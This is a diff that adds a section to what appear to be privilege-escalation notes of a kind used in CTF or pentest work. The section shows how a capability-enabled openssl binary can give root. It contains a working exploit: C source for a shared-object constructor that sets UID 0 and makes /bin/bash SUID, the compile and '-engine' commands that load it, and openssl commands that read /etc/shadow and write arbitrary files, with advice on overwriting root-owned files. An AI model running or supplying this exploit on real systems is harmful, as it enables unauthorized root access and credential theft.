@@ -1882,3 +1882,28 @@ This is the daemon-socket CVE the "not this one" note above refers to — reach 
 old AND the socket is world-writable, even when you have no sudo rights at all.
 
 <!-- promoted-slug: snapd-dirty-sock-cve-2019-7304 -->
+
+## openssl with `cap_setuid`/full capabilities -> root (`-engine` .so constructor)
+
+A binary whose `getcap` shows `= ep` (all caps) or `cap_setuid+ep` is a root primitive. GTFOBins lists
+a few, but `openssl` is common and non-obvious: openssl `dlopen()`s any shared object passed to
+`-engine`, and a shared object's `__attribute__((constructor))` runs immediately on dlopen, UNDER
+openssl's capabilities and BEFORE openssl validates the engine (the "invalid engine" error is
+expected and harmless).
+
+- No compiler on the target? Compile the .so on the attack box (match arch); it needs no openssl headers:
+  ```c
+  #include <stdlib.h>
+  #include <unistd.h>
+  __attribute__((constructor)) static void x(){ setuid(0); setgid(0); system("chmod u+s /bin/bash"); }
+  ```
+  `gcc -shared -fPIC -o pwn.so pwn.c`, upload, then `./capable-openssl req -engine ./pwn.so` -> the
+  constructor SUIDs bash -> `bash -p` = root.
+- **cap_dac_override (also implied by `= ep`)** gives arbitrary file read/write:
+  `openssl base64 -in /etc/shadow` reads any file; `openssl base64 -d -in payload.b64 -out /root/x`
+  writes any file.
+- **Ownership gotcha:** a NEW file written via cap_dac_override is owned by the CALLER, so a fresh
+  `/etc/cron.d/*` is IGNORED by cron (must be root-owned). Overwrite an EXISTING root file IN PLACE
+  (ownership preserved), or use the `-engine` route above to avoid touching system files.
+
+<!-- promoted-slug: openssl-caps-engine-root -->
